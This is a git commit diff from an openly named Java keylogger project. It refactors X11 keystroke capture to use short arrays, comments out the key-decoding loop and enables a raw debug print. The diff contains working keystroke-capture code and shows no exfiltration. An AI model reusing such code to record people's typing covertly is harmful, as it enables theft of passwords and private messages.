af2f43b7405fc799cff132b4c856798a4d78e61c
James Bacon <james.bacon@technophobia.com>
2013-02-13 14:17:54 +0000

    Updated X11KeyResults to use short arrays instead of bytes.

--- src/main/java/co/uk/baconi/keylogger/framework/impl/x11/X11KeyLogger.java
+++ src/main/java/co/uk/baconi/keylogger/framework/impl/x11/X11KeyLogger.java
@@ -1,9 +1,7 @@
 package co.uk.baconi.keylogger.framework.impl.x11;
 
-import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.HashMap;
-import java.util.List;
 import java.util.Map;
 import java.util.concurrent.BlockingQueue;
 
@@ -18,6 +16,15 @@ import com.sun.jna.platform.unix.X11.Display;
 import com.sun.jna.ptr.IntByReference;
 
 public final class X11KeyLogger extends AbstractImpl<X11KeyResult> implements KeyLogger {
+
+    private static final int _1 = 1;
+    private static final int _2 = _1 << _1;
+    private static final int _4 = _2 << _1;
+    private static final int _8 = _4 << _1;
+    private static final int _16 = _8 << _1;
+    private static final int _32 = _16 << _1;
+    private static final int _64 = _32 << _1;
+    private static final int _128 = _64 << _1;
 
     private static final Logger LOG = Logger.getLogger(X11KeyLogger.class);
 
@@ -49,8 +56,8 @@ public final class X11KeyLogger extends AbstractImpl<X11KeyResult> implements Ke
 
     @Override
     public void startLogging() {
-        final byte szKey[] = new byte[128];
-        final byte szKeyOld[] = new byte[128];
+        final byte szKey[] = new byte[32];
+        final byte szKeyOld[] = new byte[32];
 
         for (;;) {
             try {
@@ -71,56 +78,56 @@ public final class X11KeyLogger extends AbstractImpl<X11KeyResult> implements Ke
     protected void processResults(final BlockingQueue<X11KeyResult> processQueue) {
         for (;;) {
             try {
-                final byte[] keys = processQueue.take().getKeyMap();
+                final short[] keys = processQueue.take().getKeyMap();
 
-                // System.out.println("Process Thread: " + Arrays.toString(keys));
+                System.out.println("Process Thread: " + Arrays.toString(keys));
 
                 // read modifiers (caps lock is ignored)
-                boolean shift = false;
-                boolean ctrl = false;
-                boolean alt = false;
-                boolean meta = false;
-
-                final List<X11Key> keysPressed = new ArrayList<X11Key>();
-
-                for (int i = 0; i < keys.length; ++i) {
-                    for (int j = 0, test = 1; j < 8; ++j, test *= 2) {
-                        if ((keys[i] & test) == 0) {
-                            final int keyCode = i * 8 + j;
-
-                            final X11Key x11Key = keyMap.get(keyCode);
-
-                            if (x11Key == null) {
-                                continue;
-                            }
-
-                            System.out.println(keyCode);
-
-                            keysPressed.add(x11Key);
-
-                            shift = shift || x11Key.isShift();
-                            ctrl = ctrl || x11Key.isCtrl();
-                            alt = alt || x11Key.isAlt();
-                            meta = meta || x11Key.isMeta();
-                        }
-                    }
-                }
-
-                final StringBuilder keysPressedOutput = new StringBuilder();
-                for (final X11Key keyPressed : keysPressed) {
-                    keysPressedOutput.append("[");
-                    keysPressedOutput.append(keyPressed.getKeyCode());
-                    keysPressedOutput.append("-");
-                    if (keyPressed.isModifierKey()) {
-                        keysPressedOutput.append(keyPressed.getKeyNameLowerCase());
-                    } else if (shift) {
-                        keysPressedOutput.append(keyPressed.getKeyNameUpperCase());
-                    } else {
-                        keysPressedOutput.append(keyPressed.getKeyNameLowerCase());
-                    }
-                    keysPressedOutput.append("], ");
-                }
-                keysPressedOutput.deleteCharAt(keysPressedOutput.lastIndexOf(","));
+                // boolean shift = false;
+                // boolean ctrl = false;
+                // boolean alt = false;
+                // boolean meta = false;
+                //
+                // final List<X11Key> keysPressed = new ArrayList<X11Key>();
+                //
+                // for (int i = 0; i < keys.length; ++i) {
+                // for (int j = 0, test = 1; j < 8; ++j, test *= 2) {
+                // if ((keys[i] & test) == 0) {
+                // final int keyCode = i * 8 + j;
+                //
+                // final X11Key x11Key = keyMap.get(keyCode);
+                //
+                // if (x11Key == null) {
+                // continue;
+                // }
+                //
+                // // System.out.println(keyCode);
+                //
+                // keysPressed.add(x11Key);
+                //
+                // shift = shift || x11Key.isShift();
+                // ctrl = ctrl || x11Key.isCtrl();
+                // alt = alt || x11Key.isAlt();
+                // meta = meta || x11Key.isMeta();
+                // }
+                // }
+                // }
+                //
+                // final StringBuilder keysPressedOutput = new StringBuilder();
+                // for (final X11Key keyPressed : keysPressed) {
+                // keysPressedOutput.append("[");
+                // keysPressedOutput.append(keyPressed.getKeyCode());
+                // keysPressedOutput.append("-");
+                // if (keyPressed.isModifierKey()) {
+                // keysPressedOutput.append(keyPressed.getKeyNameLowerCase());
+                // } else if (shift) {
+                // keysPressedOutput.append(keyPressed.getKeyNameUpperCase());
+                // } else {
+                // keysPressedOutput.append(keyPressed.getKeyNameLowerCase());
+                // }
+                // keysPressedOutput.append("], ");
+                // }
+                // keysPressedOutput.deleteCharAt(keysPressedOutput.lastIndexOf(","));
 
                 // System.out.println(keysPressedOutput.toString());
             } catch (final Throwable t) {
--- src/main/java/co/uk/baconi/keylogger/framework/impl/x11/X11KeyResult.java
+++ src/main/java/co/uk/baconi/keylogger/framework/impl/x11/X11KeyResult.java
@@ -1,13 +1,21 @@
 package co.uk.baconi.keylogger.framework.impl.x11;
 
 final class X11KeyResult {
-    private final byte[] keyMap;
+    private final short[] keyMap;
 
     X11KeyResult(final byte[] keyMap) {
-        this.keyMap = keyMap;
+        this.keyMap = new short[keyMap.length];
+        for (int i = 0; i < this.keyMap.length; i++) {
+            final byte entry = keyMap[i];
+            if (entry < 0) {
+                this.keyMap[i] = (short) (entry + 256);
+            } else {
+                this.keyMap[i] = entry;
+            }
+        }
     }
 
-    public byte[] getKeyMap() {
+    public short[] getKeyMap() {
         return keyMap;
     }
 }
